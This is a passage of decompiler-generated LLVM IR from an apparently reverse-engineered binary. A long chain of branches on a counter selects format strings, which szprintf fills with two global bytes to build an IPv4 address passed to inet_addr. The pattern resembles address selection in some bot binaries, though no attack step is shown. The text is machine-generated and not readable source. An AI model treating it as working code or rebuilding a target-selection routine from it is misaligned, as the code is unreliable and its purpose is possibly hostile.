  br label %dec_label_pc_cf00

dec_label_pc_cf00:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_ced8
  %v7_cf04 = icmp eq i32 %v2_a7e0, 182
  br i1 %v7_cf04, label %dec_label_pc_cf0c, label %dec_label_pc_cf34

dec_label_pc_cf0c:                                ; preds = %dec_label_pc_cf00
  %v3_cf18 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cf24 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cf30 = sext i8 %v3_cf18 to i32
  %v6_cf30 = sext i8 %v3_cf24 to i32
  %v8_cf30 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_203a4.419 to i32), i32 %v4_cf30, i32 %v6_cf30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %dec_label_pc_cf00, %dec_label_pc_cf0c
  %v7_cf38 = icmp eq i32 %v2_a7e0, 183
  br i1 %v7_cf38, label %dec_label_pc_cf40, label %dec_label_pc_cf68

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cf34
  %v3_cf4c = load i8, i8* @global_var_2e471.71, align 1
  %v3_cf58 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cf64 = sext i8 %v3_cf4c to i32
  %v6_cf64 = sext i8 %v3_cf58 to i32
  %v8_cf64 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fba4.158 to i32), i32 %v4_cf64, i32 %v6_cf64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf68

dec_label_pc_cf68:                                ; preds = %dec_label_pc_cf34, %dec_label_pc_cf40
  %v7_cf6c = icmp eq i32 %v2_a7e0, 184
  br i1 %v7_cf6c, label %dec_label_pc_cf74, label %dec_label_pc_cf9c

dec_label_pc_cf74:                                ; preds = %dec_label_pc_cf68
  %v3_cf80 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cf8c = load i8, i8* @global_var_2e472.72, align 1
  %v4_cf98 = sext i8 %v3_cf80 to i32
  %v6_cf98 = sext i8 %v3_cf8c to i32
  %v8_cf98 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_203b4.422 to i32), i32 %v4_cf98, i32 %v6_cf98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf9c

dec_label_pc_cf9c:                                ; preds = %dec_label_pc_cf68, %dec_label_pc_cf74
  %v7_cfa0 = icmp eq i32 %v2_a7e0, 185
  br i1 %v7_cfa0, label %dec_label_pc_cfa8, label %dec_label_pc_cfd0

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf9c
  %v3_cfb4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cfc0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_cfcc = sext i8 %v3_cfb4 to i32
  %v6_cfcc = sext i8 %v3_cfc0 to i32
  %v8_cfcc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_203c4.424 to i32), i32 %v4_cfcc, i32 %v6_cfcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfd0

dec_label_pc_cfd0:                                ; preds = %dec_label_pc_cf9c, %dec_label_pc_cfa8
  %v7_cfd4 = icmp eq i32 %v2_a7e0, 186
  br i1 %v7_cfd4, label %dec_label_pc_cfdc, label %dec_label_pc_d004

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfd0
  %v3_cfe8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_cff4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d000 = sext i8 %v3_cfe8 to i32
  %v6_d000 = sext i8 %v3_cff4 to i32
  %v8_d000 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_203d4.426 to i32), i32 %v4_d000, i32 %v6_d000, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d004

dec_label_pc_d004:                                ; preds = %dec_label_pc_cfd0, %dec_label_pc_cfdc
  %v7_d008 = icmp eq i32 %v2_a7e0, 187
  br i1 %v7_d008, label %dec_label_pc_d010, label %dec_label_pc_d038

dec_label_pc_d010:                                ; preds = %dec_label_pc_d004
  %v3_d01c = load i8, i8* @global_var_2e471.71, align 1
  %v3_d028 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d034 = sext i8 %v3_d01c to i32
  %v6_d034 = sext i8 %v3_d028 to i32
  %v8_d034 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_203e4.428 to i32), i32 %v4_d034, i32 %v6_d034, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d038

dec_label_pc_d038:                                ; preds = %dec_label_pc_d004, %dec_label_pc_d010
  %v7_d03c = icmp eq i32 %v2_a7e0, 188
  br i1 %v7_d03c, label %dec_label_pc_d044, label %dec_label_pc_d06c

dec_label_pc_d044:                                ; preds = %dec_label_pc_d038
  %v3_d050 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d05c = load i8, i8* @global_var_2e472.72, align 1
  %v4_d068 = sext i8 %v3_d050 to i32
  %v6_d068 = sext i8 %v3_d05c to i32
  %v8_d068 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_203f4.430 to i32), i32 %v4_d068, i32 %v6_d068, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d06c

dec_label_pc_d06c:                                ; preds = %dec_label_pc_d038, %dec_label_pc_d044
  %v7_d070 = icmp eq i32 %v2_a7e0, 189
  br i1 %v7_d070, label %dec_label_pc_d078, label %dec_label_pc_d0a0

dec_label_pc_d078:                                ; preds = %dec_label_pc_d06c
  %v3_d084 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d090 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d09c = sext i8 %v3_d084 to i32
  %v6_d09c = sext i8 %v3_d090 to i32
  %v8_d09c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20404.432 to i32), i32 %v4_d09c, i32 %v6_d09c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d06c, %dec_label_pc_d078
  %v7_d0a4 = icmp eq i32 %v2_a7e0, 190
  br i1 %v7_d0a4, label %dec_label_pc_d0ac, label %dec_label_pc_d0d4

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_d0a0
  %v3_d0b8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d0c4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d0d0 = sext i8 %v3_d0b8 to i32
  %v6_d0d0 = sext i8 %v3_d0c4 to i32
  %v8_d0d0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20414.434 to i32), i32 %v4_d0d0, i32 %v6_d0d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d4

dec_label_pc_d0d4:                                ; preds = %dec_label_pc_d0a0, %dec_label_pc_d0ac
  %v7_d0d8 = icmp eq i32 %v2_a7e0, 191
  br i1 %v7_d0d8, label %dec_label_pc_d0e0, label %dec_label_pc_d108

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d0d4
  %v3_d0ec = load i8, i8* @global_var_2e471.71, align 1
  %v3_d0f8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d104 = sext i8 %v3_d0ec to i32
  %v6_d104 = sext i8 %v3_d0f8 to i32
  %v8_d104 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20424.436 to i32), i32 %v4_d104, i32 %v6_d104, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d108

dec_label_pc_d108:                                ; preds = %dec_label_pc_d0d4, %dec_label_pc_d0e0
  %v7_d10c = icmp eq i32 %v2_a7e0, 192
  br i1 %v7_d10c, label %dec_label_pc_d114, label %dec_label_pc_d13c

dec_label_pc_d114:                                ; preds = %dec_label_pc_d108
  %v3_d120 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d12c = load i8, i8* @global_var_2e472.72, align 1
  %v4_d138 = sext i8 %v3_d120 to i32
  %v6_d138 = sext i8 %v3_d12c to i32
  %v8_d138 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20434.438 to i32), i32 %v4_d138, i32 %v6_d138, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d108, %dec_label_pc_d114
  %v7_d140 = icmp eq i32 %v2_a7e0, 193
  br i1 %v7_d140, label %dec_label_pc_d148, label %dec_label_pc_d170

dec_label_pc_d148:                                ; preds = %dec_label_pc_d13c
  %v3_d154 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d160 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d16c = sext i8 %v3_d154 to i32
  %v6_d16c = sext i8 %v3_d160 to i32
  %v8_d16c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20444.440 to i32), i32 %v4_d16c, i32 %v6_d16c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d148
  %v7_d174 = icmp eq i32 %v2_a7e0, 194
  br i1 %v7_d174, label %dec_label_pc_d17c, label %dec_label_pc_d1a4

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d170
  %v3_d188 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d194 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d1a0 = sext i8 %v3_d188 to i32
  %v6_d1a0 = sext i8 %v3_d194 to i32
  %v8_d1a0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20454.442 to i32), i32 %v4_d1a0, i32 %v6_d1a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a4

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d170, %dec_label_pc_d17c
  %v7_d1a8 = icmp eq i32 %v2_a7e0, 195
  br i1 %v7_d1a8, label %dec_label_pc_d1b0, label %dec_label_pc_d1d8

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d1a4
  %v3_d1bc = load i8, i8* @global_var_2e471.71, align 1
  %v3_d1c8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d1d4 = sext i8 %v3_d1bc to i32
  %v6_d1d4 = sext i8 %v3_d1c8 to i32
  %v8_d1d4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20464.444 to i32), i32 %v4_d1d4, i32 %v6_d1d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1a4, %dec_label_pc_d1b0
  %v7_d1dc = icmp eq i32 %v2_a7e0, 196
  br i1 %v7_d1dc, label %dec_label_pc_d1e4, label %dec_label_pc_d20c

dec_label_pc_d1e4:                                ; preds = %dec_label_pc_d1d8
  %v3_d1f0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d1fc = load i8, i8* @global_var_2e472.72, align 1
  %v4_d208 = sext i8 %v3_d1f0 to i32
  %v6_d208 = sext i8 %v3_d1fc to i32
  %v8_d208 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20474.446 to i32), i32 %v4_d208, i32 %v6_d208, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d20c

dec_label_pc_d20c:                                ; preds = %dec_label_pc_d1d8, %dec_label_pc_d1e4
  %v7_d210 = icmp eq i32 %v2_a7e0, 197
  br i1 %v7_d210, label %dec_label_pc_d218, label %dec_label_pc_d240

dec_label_pc_d218:                                ; preds = %dec_label_pc_d20c
  %v3_d224 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d230 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d23c = sext i8 %v3_d224 to i32
  %v6_d23c = sext i8 %v3_d230 to i32
  %v8_d23c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20484.448 to i32), i32 %v4_d23c, i32 %v6_d23c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d20c, %dec_label_pc_d218
  %v7_d244 = icmp eq i32 %v2_a7e0, 198
  br i1 %v7_d244, label %dec_label_pc_d24c, label %dec_label_pc_d274

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d240
  %v3_d258 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d264 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d270 = sext i8 %v3_d258 to i32
  %v6_d270 = sext i8 %v3_d264 to i32
  %v8_d270 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20494.450 to i32), i32 %v4_d270, i32 %v6_d270, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d274

dec_label_pc_d274:                                ; preds = %dec_label_pc_d240, %dec_label_pc_d24c
  %v7_d278 = icmp eq i32 %v2_a7e0, 199
  br i1 %v7_d278, label %dec_label_pc_d280, label %dec_label_pc_d2a8

dec_label_pc_d280:                                ; preds = %dec_label_pc_d274
  %v3_d28c = load i8, i8* @global_var_2e471.71, align 1
  %v3_d298 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d2a4 = sext i8 %v3_d28c to i32
  %v6_d2a4 = sext i8 %v3_d298 to i32
  %v8_d2a4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_204a4.452 to i32), i32 %v4_d2a4, i32 %v6_d2a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2a8

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d274, %dec_label_pc_d280
  %v7_d2ac = icmp eq i32 %v2_a7e0, 200
  br i1 %v7_d2ac, label %dec_label_pc_d2b4, label %dec_label_pc_d2dc

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d2a8
  %v3_d2c0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d2cc = load i8, i8* @global_var_2e472.72, align 1
  %v4_d2d8 = sext i8 %v3_d2c0 to i32
  %v6_d2d8 = sext i8 %v3_d2cc to i32
  %v8_d2d8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_204b4.454 to i32), i32 %v4_d2d8, i32 %v6_d2d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2a8, %dec_label_pc_d2b4
  %v7_d2e0 = icmp eq i32 %v2_a7e0, 201
  br i1 %v7_d2e0, label %dec_label_pc_d31c, label %dec_label_pc_d310

dec_label_pc_d310:                                ; preds = %dec_label_pc_d2dc
  br label %dec_label_pc_d344

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d2dc
  %v3_d2f4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d300 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d30c = sext i8 %v3_d2f4 to i32
  %v6_d30c = sext i8 %v3_d300 to i32
  %v8_d30c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_204c4.456 to i32), i32 %v4_d30c, i32 %v6_d30c, i32 ptrtoint (i32* @0 to i32))
  %v3_d328 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d334 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d340 = sext i8 %v3_d328 to i32
  %v6_d340 = sext i8 %v3_d334 to i32
  %v8_d340 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_204d4.458 to i32), i32 %v4_d340, i32 %v6_d340, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d344

dec_label_pc_d344:                                ; preds = %dec_label_pc_d310, %dec_label_pc_d31c
  %v7_d348 = icmp eq i32 %v2_a7e0, 202
  br i1 %v7_d348, label %dec_label_pc_d350, label %dec_label_pc_d378

dec_label_pc_d350:                                ; preds = %dec_label_pc_d344
  %v3_d35c = load i8, i8* @global_var_2e471.71, align 1
  %v3_d368 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d374 = sext i8 %v3_d35c to i32
  %v6_d374 = sext i8 %v3_d368 to i32
  %v8_d374 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_204e4.460 to i32), i32 %v4_d374, i32 %v6_d374, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %dec_label_pc_d344, %dec_label_pc_d350
  %v7_d37c = icmp eq i32 %v2_a7e0, 203
  br i1 %v7_d37c, label %dec_label_pc_d384, label %dec_label_pc_d3ac

dec_label_pc_d384:                                ; preds = %dec_label_pc_d378
  %v3_d390 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d39c = load i8, i8* @global_var_2e472.72, align 1
  %v4_d3a8 = sext i8 %v3_d390 to i32
  %v6_d3a8 = sext i8 %v3_d39c to i32
  %v8_d3a8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_204f4.462 to i32), i32 %v4_d3a8, i32 %v6_d3a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d378, %dec_label_pc_d384
  %v7_d3b0 = icmp eq i32 %v2_a7e0, 204
  br i1 %v7_d3b0, label %dec_label_pc_d3b8, label %dec_label_pc_d3e0

dec_label_pc_d3b8:                                ; preds = %dec_label_pc_d3ac
  %v3_d3c4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d3d0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d3dc = sext i8 %v3_d3c4 to i32
  %v6_d3dc = sext i8 %v3_d3d0 to i32
  %v8_d3dc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20504.464 to i32), i32 %v4_d3dc, i32 %v6_d3dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e0

dec_label_pc_d3e0:                                ; preds = %dec_label_pc_d3ac, %dec_label_pc_d3b8
  %v7_d3e4 = icmp eq i32 %v2_a7e0, 205
  br i1 %v7_d3e4, label %dec_label_pc_d3ec, label %dec_label_pc_d414

dec_label_pc_d3ec:                                ; preds = %dec_label_pc_d3e0
  %v3_d3f8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d404 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d410 = sext i8 %v3_d3f8 to i32
  %v6_d410 = sext i8 %v3_d404 to i32
  %v8_d410 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20514.466 to i32), i32 %v4_d410, i32 %v6_d410, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d414

dec_label_pc_d414:                                ; preds = %dec_label_pc_d3e0, %dec_label_pc_d3ec
  %v7_d418 = icmp eq i32 %v2_a7e0, 206
  br i1 %v7_d418, label %dec_label_pc_d420, label %dec_label_pc_d448

dec_label_pc_d420:                                ; preds = %dec_label_pc_d414
  %v3_d42c = load i8, i8* @global_var_2e471.71, align 1
  %v3_d438 = load i8, i8* @global_var_2e472.72, align 1
  %v4_d444 = sext i8 %v3_d42c to i32
  %v6_d444 = sext i8 %v3_d438 to i32
  %v8_d444 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_20524.468 to i32), i32 %v4_d444, i32 %v6_d444, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d414, %dec_label_pc_d420
  %v7_d44c = icmp eq i32 %v2_a7e0, 207
  br i1 %v7_d44c, label %dec_label_pc_d454, label %dec_label_pc_d47c

dec_label_pc_d454:                                ; preds = %dec_label_pc_d448
  %v3_d460 = load i8, i8* @global_var_2e471.71, align 1
  %v3_d46c = load i8, i8* @global_var_2e472.72, align 1
  %v4_d478 = sext i8 %v3_d460 to i32
  %v6_d478 = sext i8 %v3_d46c to i32
  %v8_d478 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_20534.470 to i32), i32 %v4_d478, i32 %v6_d478, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d47c

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d448, %dec_label_pc_d454
  store i32 %v2_a70c, i32* @r0, align 4
  %v1_d4b8 = call i32 @inet_addr(i32 %v2_a70c)
  store i32 %v3_a704, i32* @fp, align 4
  ret i32 %v1_d4b8

; uselistorder directives
  uselistorder i32 %v2_a70c, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20264.378 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_201f8.363 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_20068.313 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ffdc.295 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1ff7c.283 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1fbc4.162 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1fba4.158 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1fb94.156 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1fb64.150 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d47c, { 1, 0 }
  uselistorder label %dec_label_pc_d448, { 1, 0 }
  uselistorder label %dec_label_pc_d414, { 1, 0 }
  uselistorder label %dec_label_pc_d3e0, { 1, 0 }
  uselistorder label %dec_label_pc_d3ac, { 1, 0 }
  uselistorder label %dec_label_pc_d378, { 1, 0 }
  uselistorder label %dec_label_pc_d344, { 1, 0 }
  uselistorder label %dec_label_pc_d2dc, { 1, 0 }
  uselistorder label %dec_label_pc_d2a8, { 1, 0 }
  uselistorder label %dec_label_pc_d274, { 1, 0 }
  uselistorder label %dec_label_pc_d240, { 1, 0 }
  uselistorder label %dec_label_pc_d20c, { 1, 0 }
  uselistorder label %dec_label_pc_d1d8, { 1, 0 }
  uselistorder label %dec_label_pc_d1a4, { 1, 0 }
  uselistorder label %dec_label_pc_d170, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
  uselistorder label %dec_label_pc_d108, { 1, 0 }
  uselistorder label %dec_label_pc_d0d4, { 1, 0 }
  uselistorder label %dec_label_pc_d0a0, { 1, 0 }
  uselistorder label %dec_label_pc_d06c, { 1, 0 }
  uselistorder label %dec_label_pc_d038, { 1, 0 }
  uselistorder label %dec_label_pc_d004, { 1, 0 }
  uselistorder label %dec_label_pc_cfd0, { 1, 0 }
  uselistorder label %dec_label_pc_cf9c, { 1, 0 }
  uselistorder label %dec_label_pc_cf68, { 1, 0 }
  uselistorder label %dec_label_pc_cf34, { 1, 0 }
  uselistorder label %dec_label_pc_cf00, { 1, 0 }
  uselistorder label %dec_label_pc_cecc, { 1, 0 }
  uselistorder label %dec_label_pc_ce98, { 1, 0 }
  uselistorder label %dec_label_pc_ce64, { 1, 0 }
  uselistorder label %dec_label_pc_ce30, { 1, 0 }
  uselistorder label %dec_label_pc_cdfc, { 1, 0 }
  uselistorder label %dec_label_pc_cdc8, { 1, 0 }
  uselistorder label %dec_label_pc_cd94, { 1, 0 }
  uselistorder label %dec_label_pc_cd60, { 1, 0 }
  uselistorder label %dec_label_pc_cd2c, { 1, 0 }
  uselistorder label %dec_label_pc_ccf8, { 1, 0 }
  uselistorder label %dec_label_pc_ccc4, { 1, 0 }
  uselistorder label %dec_label_pc_cc90, { 1, 0 }
  uselistorder label %dec_label_pc_cc5c, { 1, 0 }
  uselistorder label %dec_label_pc_cc28, { 1, 0 }
  uselistorder label %dec_label_pc_cbf4, { 1, 0 }
  uselistorder label %dec_label_pc_cbc0, { 1, 0 }
  uselistorder label %dec_label_pc_cb8c, { 1, 0 }
  uselistorder label %dec_label_pc_cb58, { 1, 0 }
  uselistorder label %dec_label_pc_cb24, { 1, 0 }
  uselistorder label %dec_label_pc_caf0, { 1, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0 }
  uselistorder label %dec_label_pc_ca88, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
  uselistorder label %dec_label_pc_ca20, { 1, 0 }
  uselistorder label %dec_label_pc_c9ec, { 1, 0 }
  uselistorder label %dec_label_pc_c9b8, { 1, 0 }
  uselistorder label %dec_label_pc_c984, { 1, 0 }
  uselistorder label %dec_label_pc_c950, { 1, 0 }
  uselistorder label %dec_label_pc_c91c, { 1, 0 }
  uselistorder label %dec_label_pc_c8e8, { 1, 0 }
  uselistorder label %dec_label_pc_c8b4, { 1, 0 }
  uselistorder label %dec_label_pc_c880, { 1, 0 }
  uselistorder label %dec_label_pc_c84c, { 1, 0 }
  uselistorder label %dec_label_pc_c818, { 1, 0 }
  uselistorder label %dec_label_pc_c7e4, { 1, 0 }
  uselistorder label %dec_label_pc_c7b0, { 1, 0 }
  uselistorder label %dec_label_pc_c77c, { 1, 0 }
  uselistorder label %dec_label_pc_c748, { 1, 0 }
  uselistorder label %dec_label_pc_c714, { 1, 0 }
  uselistorder label %dec_label_pc_c6e0, { 1, 0 }
  uselistorder label %dec_label_pc_c6ac, { 1, 0 }
  uselistorder label %dec_label_pc_c678, { 1, 0 }
  uselistorder label %dec_label_pc_c644, { 1, 0 }
  uselistorder label %dec_label_pc_c610, { 1, 0 }
  uselistorder label %dec_label_pc_c5dc, { 1, 0 }
  uselistorder label %dec_label_pc_c5a8, { 1, 0 }
  uselistorder label %dec_label_pc_c574, { 1, 0 }
  uselistorder label %dec_label_pc_c540, { 1, 0 }
  uselistorder label %dec_label_pc_c50c, { 1, 0 }
  uselistorder label %dec_label_pc_c4d8, { 1, 0 }
  uselistorder label %dec_label_pc_c4a4, { 1, 0 }
  uselistorder label %dec_label_pc_c470, { 1, 0 }
  uselistorder label %dec_label_pc_c43c, { 1, 0 }
  uselistorder label %dec_label_pc_c408, { 1, 0 }
  uselistorder label %dec_label_pc_c3d4, { 1, 0 }
  uselistorder label %dec_label_pc_c3a0, { 1, 0 }
  uselistorder label %dec_label_pc_c36c, { 1, 0 }
  uselistorder label %dec_label_pc_c338, { 1, 0 }
  uselistorder label %dec_label_pc_c304, { 1, 0 }
  uselistorder label %dec_label_pc_c2d0, { 1, 0 }
  uselistorder label %dec_label_pc_c29c, { 1, 0 }
  uselistorder label %dec_label_pc_c268, { 1, 0 }
  uselistorder label %dec_label_pc_c234, { 1, 0 }
  uselistorder label %dec_label_pc_c200, { 1, 0 }
  uselistorder label %dec_label_pc_c1cc, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c164, { 1, 0 }
  uselistorder label %dec_label_pc_c130, { 1, 0 }
  uselistorder label %dec_label_pc_c0fc, { 1, 0 }
  uselistorder label %dec_label_pc_c0c8, { 1, 0 }
  uselistorder label %dec_label_pc_c094, { 1, 0 }
  uselistorder label %dec_label_pc_c060, { 1, 0 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %dec_label_pc_bff8, { 1, 0 }
  uselistorder label %dec_label_pc_bfc4, { 1, 0 }
  uselistorder label %dec_label_pc_bf90, { 1, 0 }
  uselistorder label %dec_label_pc_bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_bf28, { 1, 0 }
  uselistorder label %dec_label_pc_bef4, { 1, 0 }
  uselistorder label %dec_label_pc_bec0, { 1, 0 }
  uselistorder label %dec_label_pc_be8c, { 1, 0 }
  uselistorder label %dec_label_pc_be58, { 1, 0 }
  uselistorder label %dec_label_pc_be24, { 1, 0 }
  uselistorder label %dec_label_pc_bdf0, { 1, 0 }
  uselistorder label %dec_label_pc_bdbc, { 1, 0 }
  uselistorder label %dec_label_pc_bd88, { 1, 0 }
  uselistorder label %dec_label_pc_bd54, { 1, 0 }
  uselistorder label %dec_label_pc_bd20, { 1, 0 }
  uselistorder label %dec_label_pc_bcec, { 1, 0 }
  uselistorder label %dec_label_pc_bcb8, { 1, 0 }
